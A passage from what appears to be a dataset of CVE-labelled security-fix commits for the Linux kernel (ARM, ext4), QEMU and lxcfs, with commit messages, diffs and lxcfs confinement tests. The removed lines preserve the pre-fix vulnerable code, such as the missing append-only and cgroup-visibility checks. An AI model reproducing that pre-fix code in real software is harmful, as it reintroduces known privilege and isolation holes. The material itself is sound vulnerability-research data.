18b32e8e4497f..517bfd4da1c99 100644\n--- a\/arch\/arm\/kernel\/traps.c\n+++ b\/arch\/arm\/kernel\/traps.c\n@@ -581,7 +581,7 @@ asmlinkage int arm_syscall(int no, struct pt_regs *regs)\n \t\treturn regs->ARM_r0;\n \n \tcase NR(set_tls):\n-\t\tthread->tp_value = regs->ARM_r0;\n+\t\tthread->tp_value[0] = regs->ARM_r0;\n \t\tif (tls_emu)\n \t\t\treturn 0;\n \t\tif (has_tls_reg) {\n@@ -699,7 +699,7 @@ static int get_tp_trap(struct pt_regs *regs, unsigned int instr)\n \tint reg = (instr >> 12) & 15;\n \tif (reg == 15)\n \t\treturn 1;\n-\tregs->uregs[reg] = current_thread_info()->tp_value;\n+\tregs->uregs[reg] = current_thread_info()->tp_value[0];\n \tregs->ARM_pc += 4;\n \treturn 0;\n }\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-2066","CWE_ID":"264","category":"security","commit_id":"1f5a81e41f8b1a782c68d3843e9ec1bfaadf7d72","commit_message":"From 1f5a81e41f8b1a782c68d3843e9ec1bfaadf7d72 Mon Sep 17 00:00:00 2001\nFrom: Theodore Ts'o <tytso@mit.edu>\nDate: Wed, 2 Jun 2010 22:04:39 -0400\nSubject: ext4: Make sure the MOVE_EXT ioctl can't overwrite append-only files\n\nDan Roseberg has reported a problem with the MOVE_EXT ioctl.  If the\ndonor file is an append-only file, we should not allow the operation\nto proceed, lest we end up overwriting the contents of an append-only\nfile.\n\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nCc: Dan Rosenberg <dan.j.rosenberg@gmail.com>\n---\n fs\/ext4\/move_extent.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/fs\/ext4\/move_extent.c b\/fs\/ext4\/move_extent.c\nindex 3a6c92ac131c..52abfa12762a 100644\n--- a\/fs\/ext4\/move_extent.c\n+++ b\/fs\/ext4\/move_extent.c\n@@ -960,6 +960,9 @@ mext_check_arguments(struct inode *orig_inode,\n \t\treturn -EINVAL;\n \t}\n \n+\tif (IS_IMMUTABLE(donor_inode) || IS_APPEND(donor_inode))\n+\t\treturn -EPERM;\n+\n \t\/* Ext4 move extent does not support swapfile *\/\n \tif (IS_SWAPFILE(orig_inode) || IS_SWAPFILE(donor_inode)) {\n \t\text4_debug(\"ext4 move extent: The argument files should \"\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2017-8284","CWE_ID":"264","category":"security","commit_id":"30663fd26c0307e414622c7a8607fbc04f92ec14","commit_message":"From 30663fd26c0307e414622c7a8607fbc04f92ec14 Mon Sep 17 00:00:00 2001\nFrom: Pranith Kumar <bobby.prani@gmail.com>\nDate: Thu, 23 Mar 2017 13:58:51 -0400\nSubject: [PATCH] tcg\/i386: Check the size of instruction being translated\n\nThis fixes the bug: 'user-to-root privesc inside VM via bad translation\ncaching' reported by Jann Horn here:\nhttps:\/\/bugs.chromium.org\/p\/project-zero\/issues\/detail?id=1122\n\nReviewed-by: Richard Henderson <rth@twiddle.net>\nCC: Peter Maydell <peter.maydell@linaro.org>\nCC: Paolo Bonzini <pbonzini@redhat.com>\nReported-by: Jann Horn <jannh@google.com>\nSigned-off-by: Pranith Kumar <bobby.prani@gmail.com>\nMessage-Id: <20170323175851.14342-1-bobby.prani@gmail.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n target\/i386\/translate.c | 7 +++++++\n 1 file changed, 7 insertions(+)\n\n","diff_code":"diff --git a\/target\/i386\/translate.c b\/target\/i386\/translate.c\nindex 72c1b03a2a6..1d1372fb436 100644\n--- a\/target\/i386\/translate.c\n+++ b\/target\/i386\/translate.c\n@@ -4418,6 +4418,13 @@ static target_ulong disas_insn(CPUX86State *env, DisasContext *s,\n     s->vex_l = 0;\n     s->vex_v = 0;\n  next_byte:\n+    \/* x86 has an upper limit of 15 bytes for an instruction. Since we\n+     * do not want to decode and generate IR for an illegal\n+     * instruction, the following check limits the instruction size to\n+     * 25 bytes: 14 prefix + 1 opc + 6 (modrm+sib+ofs) + 4 imm *\/\n+    if (s->pc - pc_start > 14) {\n+        goto illegal_op;\n+    }\n     b = cpu_ldub_code(env, s->pc);\n     s->pc++;\n     \/* Collect prefixes.  *\/\n","owner":"qemu","repo":"qemu","source":"cve"},{"CVE_ID":"CVE-2015-1342","CWE_ID":"264","category":"security","commit_id":"a8b6c3e0537e90fba3c55910fd1b7229d54a60a7","commit_message":"From a8b6c3e0537e90fba3c55910fd1b7229d54a60a7 Mon Sep 17 00:00:00 2001\nFrom: Serge Hallyn <serge.hallyn@ubuntu.com>\nDate: Fri, 13 Nov 2015 17:07:36 -0600\nSubject: [PATCH] Fix checking of parent directories\n\nTaken from the justification in the launchpad bug:\n\nTo a task in freezer cgroup \/a\/b\/c\/d, it should appear that there are no\ncgroups other than its descendents. Since this is a filesystem, we must have\nthe parent directories, but each parent cgroup should only contain the child\nwhich the task can see.\n\nSo, when this task looks at \/a\/b, it should see only directory 'c' and no\nfiles. Attempt to create \/a\/b\/x should result in -EPERM, whether \/a\/b\/x already\nexists or not. Attempts to query \/a\/b\/x should result in -ENOENT whether \/a\/b\/x\nexists or not. Opening \/a\/b\/tasks should result in -ENOENT.\n\nThe caller_may_see_dir checks specifically whether a task may see a cgroup\ndirectory - i.e. \/a\/b\/x if opening \/a\/b\/x\/tasks, and \/a\/b\/c\/d if doing\nopendir('\/a\/b\/c\/d').\n\ncaller_is_in_ancestor() will return true if the caller in \/a\/b\/c\/d looks at\n\/a\/b\/c\/d\/e. If the caller is in a child cgroup of the queried one - i.e. if the\ntask in \/a\/b\/c\/d queries \/a\/b, then *nextcg will container the next (the only)\ndirectory which he can see in the path - 'c'.\n\nBeyond this, regular DAC permissions should apply, with the\nroot-in-user-namespace privilege over its mapped uids being respected. The\nfc_may_access check does this check for both directories and files.\n\nThis is CVE-2015-1342 (LP: #1508481)\n\nSigned-off-by: Serge Hallyn <serge.hallyn@ubuntu.com>\n---\n Makefile.am               |   8 +-\n lxcfs.c                   | 137 ++++++++----\n tests\/test_confinement.sh |  96 ++++++++\n tests\/test_syscalls.c     | 451 ++++++++++++++++++++++++++++++++++++++\n 4 files changed, 646 insertions(+), 46 deletions(-)\n create mode 100644 tests\/test_confinement.sh\n create mode 100644 tests\/test_syscalls.c\n\n","diff_code":"diff --git a\/Makefile.am b\/Makefile.am\nindex 7dda776..cc19ce7 100644\n--- a\/Makefile.am\n+++ b\/Makefile.am\n@@ -29,11 +29,12 @@ endif\n \n TEST_READ: tests\/test-read.c\n \t$(CC) -o tests\/test-read tests\/test-read.c\n-\n TEST_CPUSET: tests\/cpusetrange.c cpuset.c\n \t$(CC) -o tests\/cpusetrange tests\/cpusetrange.c cpuset.c\n+TEST_SYSCALLS: tests\/test_syscalls.c\n+\t$(CC) -o tests\/test_syscalls tests\/test_syscalls.c\n \n-tests: TEST_READ TEST_CPUSET\n+tests: TEST_READ TEST_CPUSET TEST_SYSCALLS\n \n distclean:\n \trm -rf .deps\/ \\\n@@ -60,4 +61,5 @@ distclean:\n \t\tlxcfs.o \\\n \t\tm4\/ \\\n \t\tmissing \\\n-\t\tstamp-h1\n+\t\tstamp-h1 \\\n+\t\ttests\/test_syscalls\ndiff --git a\/lxcfs.c b\/lxcfs.c\nindex e2ccc5e..2c5aca4 100644\n--- a\/lxcfs.c\n+++ b\/lxcfs.c\n@@ -235,6 +235,12 @@ static bool perms_include(int fmode, mode_t req_mode)\n \treturn ((fmode & r) == r);\n }\n \n+\n+\/*\n+ * taskcg is  a\/b\/c\n+ * querycg is \/a\/b\/c\/d\/e\n+ * we return 'd'\n+ *\/\n static char *get_next_cgroup_dir(const char *taskcg, const char *querycg)\n {\n \tchar *start, *end;\n@@ -378,53 +384,71 @@ static void prune_init_slice(char *cg)\n  *\/\n static bool caller_is_in_ancestor(pid_t pid, const char *contrl, const char *cg, char **nextcg)\n {\n-\tchar fnam[PROCLEN];\n-\tFILE *f;\n \tbool answer = false;\n-\tchar *line = NULL;\n-\tsize_t len = 0;\n-\tint ret;\n+\tchar *c2 = get_pid_cgroup(pid, contrl);\n+\tchar *linecmp;\n \n-\tret = snprintf(fnam, PROCLEN, \"\/proc\/%d\/cgroup\", pid);\n-\tif (ret < 0 || ret >= PROCLEN)\n-\t\treturn false;\n-\tif (!(f = fopen(fnam, \"r\")))\n+\tif (!c2)\n \t\treturn false;\n+\tprune_init_slice(c2);\n \n-\twhile (getline(&line, &len, f) != -1) {\n-\t\tchar *c1, *c2, *linecmp;\n-\t\tif (!line[0])\n-\t\t\tcontinue;\n-\t\tc1 = strchr(line, ':');\n-\t\tif (!c1)\n-\t\t\tgoto out;\n-\t\tc1++;\n-\t\tc2 = strchr(c1, ':');\n-\t\tif (!c2)\n-\t\t\tgoto out;\n-\t\t*c2 = '\\0';\n-\t\tif (strcmp(c1, contrl) != 0)\n-\t\t\tcontinue;\n-\t\tc2++;\n-\t\tstripnewline(c2);\n-\t\tprune_init_slice(c2);\n-\t\t\/*\n-\t\t * callers pass in '\/' for root cgroup, otherwise they pass\n-\t\t * in a cgroup without leading '\/'\n-\t\t *\/\n-\t\tlinecmp = *cg == '\/' ? c2 : c2+1;\n-\t\tif (strncmp(linecmp, cg, strlen(linecmp)) != 0) {\n-\t\t\tif (nextcg)\n-\t\t\t\t*nextcg = get_next_cgroup_dir(linecmp, cg);\n-\t\t\tgoto out;\n+\t\/*\n+\t * callers pass in '\/' for root cgroup, otherwise they pass\n+\t * in a cgroup without leading '\/'\n+\t *\/\n+\tlinecmp = *cg == '\/' ? c2 : c2+1;\n+\tif (strncmp(linecmp, cg, strlen(linecmp)) != 0) {\n+\t\tif (nextcg) {\n+\t\t\t*nextcg = get_next_cgroup_dir(linecmp, cg);\n \t\t}\n+\t\tgoto out;\n+\t}\n+\tanswer = true;\n+\n+out:\n+\tfree(c2);\n+\treturn answer;\n+}\n+\n+\/*\n+ * If caller is in \/a\/b\/c, he may see that \/a exists, but not \/b or \/a\/c.\n+ *\/\n+static bool caller_may_see_dir(pid_t pid, const char *contrl, const char *cg)\n+{\n+\tbool answer = false;\n+\tchar *c2, *task_cg;\n+\tsize_t target_len, task_len;\n+\n+\tif (strcmp(cg, \"\/\") == 0)\n+\t\treturn true;\n+\n+\tc2 = get_pid_cgroup(pid, contrl);\n+\n+\tif (!c2)\n+\t\treturn false;\n+\n+\ttask_cg = c2 + 1;\n+\ttarget_len = strlen(cg);\n+\ttask_len = strlen(task_cg);\n+\tif (strcmp(cg, task_cg) == 0) {\n \t\tanswer = true;\n \t\tgoto out;\n \t}\n+\tif (target_len < task_len) {\n+\t\t\/* looking up a parent dir *\/\n+\t\tif (strncmp(task_cg, cg, target_len) == 0 && task_cg[target_len] == '\/')\n+\t\t\tanswer = true;\n+\t\tgoto out;\n+\t}\n+\tif (target_len > task_len) {\n+\t\t\/* looking up a child dir *\/\n+\t\tif (strncmp(task_cg, cg, task_len) == 0 && cg[task_len] == '\/')\n+\t\t\tanswer = true;\n+\t\tgoto out;\n+\t}\n \n out:\n-\tfclose(f);\n-\tfree(line);\n+\tfree(c2);\n \treturn answer;\n }\n \n@@ -552,6 +576,10 @@ static int cg_getattr(const char *path, struct stat *sb)\n \t * cgroup, or cgdir if fpath is a file *\/\n \n \tif (is_child_cgroup(controller, path1, path2)) {\n+\t\tif (!caller_may_see_dir(fc->pid, controller, cgroup)) {\n+\t\t\tret = -ENOENT;\n+\t\t\tgoto out;\n+\t\t}\n \t\tif (!caller_is_in_ancestor(fc->pid, controller, cgroup, NULL)) {\n \t\t\t\/* this is just \/cgroup\/controller, return it as a dir *\/\n \t\t\tsb->st_mode = S_IFDIR | 00555;\n@@ -630,8 +658,11 @@ static int cg_opendir(const char *path, struct fuse_file_info *fi)\n \t\t}\n \t}\n \n-\tif (cgroup && !fc_may_access(fc, controller, cgroup, NULL, O_RDONLY)) {\n-\t\treturn -EACCES;\n+\tif (cgroup) {\n+\t\tif (!caller_may_see_dir(fc->pid, controller, cgroup))\n+\t\t\treturn -ENOENT;\n+\t\tif (!fc_may_access(fc, controller, cgroup, NULL, O_RDONLY))\n+\t\t\treturn -EACCES;\n \t}\n \n \t\/* we'll free this at cg_releasedir *\/\n@@ -780,6 +811,10 @@ static int cg_open(const char *path, struct fuse_file_info *fi)\n \t}\n \tfree_key(k);\n \n+\tif (!caller_may_see_dir(fc->pid, controller, path1)) {\n+\t\tret = -ENOENT;\n+\t\tgoto out;\n+\t}\n \tif (!fc_may_access(fc, controller, path1, path2, fi->flags)) {\n \t\t\/\/ should never get here\n \t\tret = -EACCES;\n@@ -1563,7 +1598,7 @@ int cg_chmod(const char *path, mode_t mode)\n int cg_mkdir(const char *path, mode_t mode)\n {\n \tstruct fuse_context *fc = fuse_get_context();\n-\tchar *fpath = NULL, *path1, *cgdir = NULL, *controller;\n+\tchar *fpath = NULL, *path1, *cgdir = NULL, *controller, *next = NULL;\n \tconst char *cgroup;\n \tint ret;\n \n@@ -1585,6 +1620,14 @@ int cg_mkdir(const char *path, mode_t mode)\n \telse\n \t\tpath1 = cgdir;\n \n+\tif (!caller_is_in_ancestor(fc->pid, controller, path1, &next)) {\n+\t\tif (fpath && strcmp(next, fpath) == 0)\n+\t\t\tret = -EEXIST;\n+\t\telse\n+\t\t\tret = -ENOENT;\n+\t\tgoto out;\n+\t}\n+\n \tif (!fc_may_access(fc, controller, path1, NULL, O_RDWR)) {\n \t\tret = -EACCES;\n \t\tgoto out;\n@@ -1599,13 +1642,14 @@ int cg_mkdir(const char *path, mode_t mode)\n \n out:\n \tfree(cgdir);\n+\tfree(next);\n \treturn ret;\n }\n \n static int cg_rmdir(const char *path)\n {\n \tstruct fuse_context *fc = fuse_get_context();\n-\tchar *fpath = NULL, *cgdir = NULL, *controller;\n+\tchar *fpath = NULL, *cgdir = NULL, *controller, *next = NULL;\n \tconst char *cgroup;\n \tint ret;\n \n@@ -1626,8 +1670,14 @@ static int cg_rmdir(const char *path)\n \t\tgoto out;\n \t}\n \n-\tfprintf(stderr, \"rmdir: verifying access to %s:%s (req path %s)\\n\",\n-\t\t\tcontroller, cgdir, path);\n+\tif (!caller_is_in_ancestor(fc->pid, controller, cgroup, &next)) {\n+\t\tif (!fpath || strcmp(next, fpath) == 0)\n+\t\t\tret = -EBUSY;\n+\t\telse\n+\t\t\tret = -ENOENT;\n+\t\tgoto out;\n+\t}\n+\n \tif (!fc_may_access(fc, controller, cgdir, NULL, O_WRONLY)) {\n \t\tret = -EACCES;\n \t\tgoto out;\n@@ -1646,6 +1696,7 @@ static int cg_rmdir(const char *path)\n \n out:\n \tfree(cgdir);\n+\tfree(next);\n \treturn ret;\n }\n \ndiff --git a\/tests\/test_confinement.sh b\/tests\/test_confinement.sh\nnew file mode 100644\nindex 0000000..8f5f484\n--- \/dev\/null\n+++ b\/tests\/test_confinement.sh\n@@ -0,0 +1,96 @@\n+#!\/bin\/bash\n+\n+set -ex\n+\n+[ $(id -u) -eq 0 ]\n+\n+d=$(mktemp -t -d tmp.XXX)\n+d2=$(mktemp -t -d tmp.XXX)\n+\n+pid=-1\n+cleanup() {\n+\t[ $pid -ne -1 ] && kill -9 $pid\n+\tumount -l $d || true\n+\tumount -l $d2 || true\n+\trm -rf $d $d2\n+}\n+\n+cmdline=$(realpath $0)\n+dirname=$(dirname ${cmdline})\n+topdir=$(dirname ${dirname})\n+\n+trap cleanup EXIT HUP INT TERM\n+\n+${topdir}\/lxcfs $d &\n+pid=$!\n+\n+# put ourselves into x1\n+cgm movepidabs freezer \/ $$\n+cgm create freezer x1\n+cgm movepid freezer x1 $$\n+\n+mount -t cgroup -o freezer freezer $d2\n+sudo rmdir $d2\/lxcfs_test_a1\/lxcfs_test_a2 || true\n+sudo rmdir $d2\/lxcfs_test_a1 || true\n+\n+echo \"Making sure root cannot mkdir\"\n+bad=0\n+mkdir $d\/cgroup\/freezer\/lxcfs_test_a1 && bad=1\n+if [ \"${bad}\" -eq 1 ]; then\n+\tfalse\n+fi\n+\n+echo \"Making sure root cannot rmdir\"\n+mkdir $d2\/lxcfs_test_a1\n+mkdir $d2\/lxcfs_test_a1\/lxcfs_test_a2\n+rmdir $d\/cgroup\/freezer\/lxcfs_test_a1 && bad=1\n+if [ \"${bad}\" -eq 1 ]; then\n+\tfalse\n+fi\n+[ -d $d2\/lxcfs_test_a1 ]\n+rmdir $d\/cgroup\/freezer\/lxcfs_test_a1\/lxcfs_test_a2 && bad=1\n+if [ \"${bad}\" -eq 1 ]; then\n+\tfalse\n+fi\n+[ -d $d2\/lxcfs_test_a1\/lxcfs_test_a2 ]\n+\n+echo \"Making sure root cannot read\/write\"\n+sleep 200 &\n+p=$!\n+echo $p > $d\/cgroup\/freezer\/lxcfs_test_a1\/tasks && bad=1\n+if [ \"${bad}\" -eq 1 ]; then\n+\tfalse\n+fi\n+cat $d\/cgroup\/freezer\/lxcfs_test_a1\/tasks && bad=1\n+if [ \"${bad}\" -eq 1 ]; then\n+\tfalse\n+fi\n+echo $p > $d\/cgroup\/freezer\/lxcfs_test_a1\/lxcfs_test_a2\/tasks && bad=1\n+if [ \"${bad}\" -eq 1 ]; then\n+\tfalse\n+fi\n+cat $d\/cgroup\/freezer\/lxcfs_test_a1\/lxcfs_test_a2\/tasks && bad=1\n+if [ \"${bad}\" -eq 1 ]; then\n+\tfalse\n+fi\n+\n+# make sure things like truncate and access don't leak info about\n+# the \/lxcfs_test_a1 cgroup which we shouldn't be able to reach\n+echo \"Testing other system calls\"\n+${dirname}\/test_syscalls $d\/cgroup\/freezer\/lxcfs_test_a1\n+${dirname}\/test_syscalls $d\/cgroup\/freezer\/lxcfs_test_a1\/lxcfs_test_a2\n+\n+echo \"Making sure root can act on descendents\"\n+mycg=$(cgm getpidcgroupabs freezer $$)\n+newcg=${mycg}\/lxcfs_test_a1\n+rmdir $d2\/$newcg || true  # cleanup previosu run\n+mkdir $d\/cgroup\/freezer\/$newcg\n+echo $p > $d\/cgroup\/freezer\/$newcg\/tasks\n+cat $d\/cgroup\/freezer\/$newcg\/tasks\n+kill -9 $p\n+while [ `wc -l $d\/cgroup\/freezer\/$newcg\/tasks | awk '{ print $1 }'` -ne 0 ]; do\n+\tsleep 1\n+done\n+rmdir $d\/cgroup\/freezer\/$newcg\n+\n+echo \"All tests passed!\"\ndiff --git a\/tests\/test_syscalls.c b\/tests\/test_syscalls.c\nnew file mode 100644\nindex 0000000..8561cfc\n--- \/dev\/null\n+++ b\/tests\/test_syscalls.c\n@@ -0,0 +1,451 @@\n+#define _GNU_SOURCE\n+#include <stdio.h>\n+#include <stdlib.h>\n+#include <string.h>\n+#include <unistd.h>\n+#include <sys\/types.h>\n+#include <sys\/socket.h>\n+#include <linux\/un.h>\n+#include <attr\/xattr.h>\n+#include <utime.h>\n+#include <sys\/stat.h>\n+#include <sys\/mount.h>\n+#include <libgen.h>\n+#include <fcntl.h>\n+#include <errno.h>\n+\n+\n+void test_open(const char *path)\n+{\n+\tint fd = open(path, O_RDONLY);\n+\tif (fd >= 0) {\n+\t\tfprintf(stderr, \"leak at open of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT) {\n+\t\tfprintf(stderr, \"leak at open of %s: errno was %d\\n\", path, errno);\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_stat(const char *path)\n+{\n+\tstruct stat sb;\n+\tif (stat(path, &sb) >= 0) {\n+\t\tfprintf(stderr, \"leak at stat of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT) {\n+\t\tfprintf(stderr, \"leak at stat of %s: errno was %d\\n\", path, errno);\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_access(const char *path)\n+{\n+\tif (access(path, O_RDONLY) >= 0) {\n+\t\tfprintf(stderr, \"leak at access of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT) {\n+\t\tfprintf(stderr, \"leak at access of %s: errno was %d\\n\", path, errno);\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_bind(const char *path)\n+{\n+\tint sfd;\n+\tstruct sockaddr_un my_addr, peer_addr;\n+\n+\tsfd = socket(AF_UNIX, SOCK_STREAM, 0);\n+\n+\tif (sfd < 0) {\n+\t\tfprintf(stderr, \"Failed to open a socket for bind test\\n\");\n+\t\texit(1);\n+\t}\n+\tmemset(&my_addr, 0, sizeof(struct sockaddr_un));\n+\tmy_addr.sun_family = AF_UNIX;\n+\tstrncpy(my_addr.sun_path, path,\n+\t\t\tsizeof(my_addr.sun_path) - 1);\n+\tif (bind(sfd, (struct sockaddr *) &my_addr,\n+\t\t\t\tsizeof(struct sockaddr_un)) != -1) {\n+\t\tfprintf(stderr, \"leak at bind of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at bind of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+\tclose(sfd);\n+}\n+\n+void test_bindmount(const char *path)\n+{\n+\tif (mount(path, path, \"none\", MS_BIND, NULL) == 0) {\n+\t\tfprintf(stderr, \"leak at bind mount of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_truncate(const char *path)\n+{\n+\tif (truncate(path, 0) == 0) {\n+\t\tfprintf(stderr, \"leak at truncate of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_chdir(const char *path)\n+{\n+\tif (chdir(path) == 0) {\n+\t\tfprintf(stderr, \"leak at chdir to %s\\n\", path);\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_rename(const char *path)\n+{\n+\tchar *d = strdupa(path), *tmpname;\n+\td = dirname(d);\n+\tsize_t len = strlen(path) + 30;\n+\n+\ttmpname = alloca(len);\n+\tsnprintf(tmpname, len, \"%s\/%d\", d, (int)getpid());\n+\tif (rename(path, tmpname) == 0 || errno != ENOENT) {\n+\t\tfprintf(stderr, \"leak at rename of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_mkdir(const char *path)\n+{\n+\tsize_t len = strlen(path) + 30;\n+\tchar *tmpname = alloca(len);\n+\tsnprintf(tmpname, len, \"%s\/%d\", path, (int)getpid());\n+\n+\tif (mkdir(path, 0755) == 0) {\n+\t\tfprintf(stderr, \"leak at mkdir of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT) {\n+\t\tfprintf(stderr, \"leak at mkdir of %s, errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+\tif (mkdir(tmpname, 0755) == 0) {\n+\t\tfprintf(stderr, \"leak at mkdir of %s\\n\", tmpname);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT) {\n+\t\tfprintf(stderr, \"leak at mkdir of %s, errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_rmdir(const char *path)\n+{\n+\tsize_t len = strlen(path) + 30;\n+\tchar *tmpname = alloca(len);\n+\tsnprintf(tmpname, len, \"%s\/%d\", path, (int)getpid());\n+\n+\tif (rmdir(path) == 0 || errno != ENOENT) {\n+\t\tfprintf(stderr, \"leak at rmdir of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (rmdir(tmpname) == 0 || errno != ENOENT) {\n+\t\tfprintf(stderr, \"leak at rmdir of %s\\n\", tmpname);\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_creat(const char *path)\n+{\n+\tif (creat(path, 0755) >= 0) {\n+\t\tfprintf(stderr, \"leak at creat of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at creat of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_link(const char *path)\n+{\n+\tchar *d = strdupa(path), *tmpname;\n+\td = dirname(d);\n+\tsize_t len = strlen(path) + 30;\n+\ttmpname = alloca(len);\n+\tsnprintf(tmpname, len, \"%s\/%d\", d, (int)getpid());\n+\n+\tif (link(path, tmpname) == 0) {\n+\t\tfprintf(stderr, \"leak at link of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at link of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+\n+\tif (link(tmpname, path) == 0) {\n+\t\tfprintf(stderr, \"leak at link (2) of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at link (2) of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_unlink(const char *path)\n+{\n+\tif (unlink(path) == 0) {\n+\t\tfprintf(stderr, \"leak at unlink of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at unlink of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_symlink(const char *path)\n+{\n+\tchar *d = strdupa(path), *tmpname;\n+\td = dirname(d);\n+\tsize_t len = strlen(path) + 30;\n+\ttmpname = alloca(len);\n+\tsnprintf(tmpname, len, \"%s\/%d\", d, (int)getpid());\n+\n+\tif (symlink(tmpname, path) == 0) {\n+\t\tfprintf(stderr, \"leak at symlink of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at symlink of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+\tif (symlink(path, tmpname) == 0) {\n+\t\tfprintf(stderr, \"leak at symlink (2) of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at symlink (2) of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_readlink(const char *path)\n+{\n+\tchar *dest = alloca(2 * strlen(path));\n+\n+\tif (readlink(path, dest, 2 * strlen(path)) >= 0) {\n+\t\tfprintf(stderr, \"leak at readlink of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at readlink of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_chmod(const char *path)\n+{\n+\tif (chmod(path, 0755) == 0) {\n+\t\tfprintf(stderr, \"leak at chmod of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at chmod of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_chown(const char *path)\n+{\n+\tif (chown(path, 0, 0) == 0) {\n+\t\tfprintf(stderr, \"leak at chown of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at chown of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_lchown(const char *path)\n+{\n+\tif (lchown(path, 0, 0) == 0) {\n+\t\tfprintf(stderr, \"leak at lchown of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at lchown of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_mknod(const char *path)\n+{\n+\tif (mknod(path, 0755, makedev(0, 0)) == 0) {\n+\t\tfprintf(stderr, \"leak at mknod of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at mknod of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_chroot(const char *path)\n+{\n+\tif (chroot(path) == 0) {\n+\t\tfprintf(stderr, \"leak at chroot of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at chroot of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_xattrs(const char *path)\n+{\n+\t\/*\n+\t * might consider doing all of:\n+\t *  setxattr\n+\t *  lsetxattr\n+\t *  getxattr\n+\t *  lgetxattr\n+\t *  listxattr\n+\t *  llistxattr\n+\t *  removexattr\n+\t *  lremovexattr\n+\t *\/\n+\t char value[200];\n+\t if (getxattr(path, \"security.selinux\", value, 200) >= 0) {\n+\t\tfprintf(stderr, \"leak at getxattr of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at getxattr of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_utimes(const char *path)\n+{\n+\tstruct utimbuf times;\n+\ttimes.actime = 0;\n+\ttimes.modtime = 0;\n+\n+\tif (utime(path, &times) == 0) {\n+\t\tfprintf(stderr, \"leak at utime of %s\\n\", path);\n+\t\texit(1);\n+\t}\n+\tif (errno != ENOENT && errno != ENOSYS) {\n+\t\tfprintf(stderr, \"leak at utime of %s: errno was %s\\n\", path, strerror(errno));\n+\t\texit(1);\n+\t}\n+}\n+\n+void test_openat(const char *path)\n+{\n+\tchar *d = strdupa(path), *f, *tmpname;\n+\tint fd, fd2;\n+\tf = 